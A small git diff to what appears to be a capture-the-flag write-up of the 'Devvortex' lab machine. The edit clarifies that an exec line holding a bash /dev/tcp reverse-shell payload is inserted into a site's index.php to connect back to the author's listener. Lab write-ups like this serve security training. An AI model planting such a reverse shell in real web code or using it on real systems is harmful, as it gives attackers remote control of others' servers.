@@ -97,7 +97,7 @@ On my system, I create a listener on port 69:
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/0c0ffe06-12c6-470f-bb1c-04c4214facbc)
 
-Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");`, with `10.10.16.4` being my system's IP:
+Back on the devvortex system, I add the line `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.4/69 0>&1'");` to the php code of `index.php`, with `10.10.16.4` being my system's IP:
 
 ![image](https://github.com/Archan6el/Devvortex-Writeup/assets/91164464/46054c87-6b9e-42d8-b9b9-f686fc0709f4)
 
